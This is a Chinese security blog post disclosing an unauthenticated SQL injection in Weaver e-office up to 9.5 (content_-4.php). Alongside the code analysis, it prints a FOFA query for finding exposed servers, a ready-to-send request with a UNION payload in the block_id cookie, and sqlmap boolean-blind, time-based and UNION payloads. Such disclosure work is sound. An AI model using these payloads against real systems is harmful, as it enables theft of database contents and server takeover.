---
title: "泛微e-office content_-4.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-general-new_mytable-content_list-content-sqli.html
asset_dir: assets/泛微e-office-content_-4.php-sql注入漏洞
---

# 泛微e-office content\_-4.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/13 08:23
- 944浏览
- [0评论](#comment)
- 28分钟阅读

深入探索

sql

身份验证

软件

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office content\_-4.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

编程

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

general/new\_mytable/content*list/content*-4.php 业务逻辑如下

```
<?php

include_once( "inc/conn.php" );
include_once( "inc/utility_all.php" );
include_once( "inc/function_usergeneral.php" );
include_once( "general/new_mytable/index_function.php" );
includelangpak( "index", $lang );
$nothingdata = $_lang['index_no_data'];
require_once( "inc/function_weather.php" );
require_once( "inc/weather.inc.php" );
$paraarray = getindexpara( $block_id );

...

function getIndexPara( $block_id )
{
    global $connection;
    $query = "\r\n\t\tSELECT * FROM `index_block` WHERE BLOCK_ID={$block_id}\r\n\t\t";
    $rc = exequery( $connection, $query );
    $row = mysql_fetch_array( $rc );
    if ( $row['FONT_STYLE'] == "" )
    {
        $row['FONT_STYLE'] = "black";
    }
    $index_array = array( "block_row" => $row['BLOCK_ROW'], "subject_length" => $row['SUBJECT_LENGTH'], "common_id" => $row['COMMON_ID'], "is_show_date" => $row['IS_SHOW_DATE'], "is_show_creator" => $row['IS_SHOW_CREATOR'], "block_effect" => $row['BLOCK_EFFECT'], "common_str" => $row['COMMON_STR'], "font_style" => $row['FONT_STYLE'], "block_height" => $row['BLOCK_HEIGHT'], "block_layout" => $row['BLOCK_LAYOUT'], "portal_index" => $row['PORTAL_INDEX'] );
    return $index_array;
}
```

`$block_id` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /general/new_mytable/content_list/content_-4.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Cookie: block_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x4e6b5271596d6c6c4f63796e445741616750714a506d4c464e5075417659424c4c47647a4f48534c,0x7162716a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
```

[![泛微e-office content_-4.php sql注入漏洞](images/img-001-f124725bb1ec.webp)](https://image.mrxn.net/fee351286baf4ccaa63e307064a6ea35.webp)

成功在响应回显测试payload

代码安全审计

<https://mrxn.net/tag/sqlmap> 结果如下

```
sqlmap identified the following injection point(s) with a total of 78 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: block_id=(SELECT (CASE WHEN (9822=9822) THEN 1 ELSE (SELECT 9884 UNION SELECT 3565) END))

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: block_id=1 AND 1007=BENCHMARK(5000000,MD5(0x5571676b))

    Type: UNION query
    Title: Generic UNION query (NULL) - 18 columns
    Payload: block_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170706a71,0x4e6b5271596d6c6c4f63796e445741616750714a506d4c464e5075417659424c4c47647a4f48534c,0x7162716a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

同目录下其他类似 content\_xxx.php 的基本上都存在同类型问题

漏洞预警服务

[![泛微e-office content_-4.php sql注入漏洞](images/img-002-ce290ad39971.webp)](https://image.mrxn.net/d9ba37c4647d47fb94499b9a92c92785.webp)

[![泛微e-office content_-4.php sql注入漏洞](images/img-003-e50fa10da585.webp)](https://image.mrxn.net/d298ce2688c149168ce44b83556d03af.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
